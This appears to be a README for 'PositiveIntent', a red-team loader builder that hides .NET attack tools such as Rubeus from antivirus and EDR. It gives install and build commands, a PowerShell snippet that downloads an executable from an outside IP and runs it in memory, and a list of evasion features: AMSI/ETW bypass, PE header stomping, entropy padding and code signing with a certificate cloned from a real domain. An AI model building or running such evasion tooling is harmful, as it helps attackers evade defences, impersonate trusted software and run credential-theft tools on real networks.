# PositiveIntent
> [!WARNING]  
> Beta release. Please create an issue with as much detail as possible if you run into any bugs.

## Installation (Kali/Debian-Based)

```
sudo apt update && apt install -y osslsigncode dirmngr ca-certificates gnupg
sudo echo "deb [trusted=yes] https://download.mono-project.com/repo/debian stable-buster main" | tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update && apt install -y mono-complete
cd PositiveIntent
pip install -r requirements.txt
```

## Example Usage

```
python build.py --file ~/Rubeus.exe --hostname TEST --domain www.slack.com --args "dump /nowrap" --writetofile

[+] Obfuscated loader source files
[+] Keyed on hostname TEST
[+] Randomized loader filename
[+] Encrypted and embedded /home/kali/Rubeus.exe as a resource file
[*] Your decryption key is fgSDxBWIRQWJaIOS
[*] Building loader and adjusting entropy...please hold.
[+] Embedded 4 books as resource files
[+] Entropy of loader: 5.45
[+] Signed loader with certificate cloned from www.slack.com
[+] Loader compiled to /home/kali/PositiveIntent/temp/nJbxZAGC.exe
```

## Reflectively Loading (Not Recommended)

```
$bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/bvqBDNHE.exe' -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entrypoint = $assembly.EntryPoint; [string[]]$arguments = 'dump /nowrap'.Split(' ')
[System.Environment]::CurrentDirectory = (Get-Location).Path
$entrypoint.Invoke($null, @(,$arguments))
```

## Features

- AMSI and ETW bypassed via hardware breakpoints using the VEH² technique. No usage of SetThreadContext. No memory patching.
- PE headers of your assembly (after it's been decrypted and loaded) are stomped to hide it from memory page scanners looking for implanted PE signatures.
- Hostname keying. 
- Optional flag to redirect output to an encrypted file. Useful to avoid outputting signatured text to console (e.g. tool logos).
- Optional flag to hardcode arguments to be passed to your assembly. Useful to avoid passing signatured arguments on the command line.
- Python pre-build scripts obfuscate loader source code (the code is disgusting don't read it please).
- Your .NET assembly of choice (Rubeus etc.) is embedded in the loader in chunks as resource files and RC4 encrypted. Reconstructed on runtime.
- No suspicious usage of crypto libraries - RC4 encryption/decryption is performed using a "raw" implementation of the RC4 algorithm (thanks ChatGPT).
- No P/Invoke usage. D/Invoke only.
- Copyright free English books are embedded as resource files in the loader to keep Shannon entropy between 4.50-5.50.
- Python post-build script signs the loader with a self-signed certificate using values cloned from a domain of your choice.
- Built with .NET Framework 4.5.1 and C# 7.3 for compatibility with various Windows versions.

## References
[CrowdStrike Researchers Investigate the Threat of Patchless AMSI Bypass Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/)  
[Anatomy of a .NET Assembly – The DOS Stub](https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-the-dos-stub/)  
[A Dive Into the PE File Format](https://0xrick.github.io/win-internals/pe3)  
[Hiding your .NET - ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)  
[Red Team Tradecraft: Loading Encrypted C# Assemblies In Memory](https://www.mike-gualtieri.com/posts/red-team-tradecraft-loading-encrypted-c-sharp-assemblies-in-memory)  
[Building, Modifying, and Packing with Azure DevOps](https://blog.xpnsec.com/building-modifying-packing-devops/)  
[Announcing the .NET Framework 4.8](https://devblogs.microsoft.com/dotnet/announcing-the-net-framework-4-8/)  
[Understanding ETW Patching](https://jonny-johnson.medium.com/understanding-etw-patching-9f5af87f9d7b)  
[ChatGPT](https://chatgpt.com/)  
[Claude](https://claude.ai/)
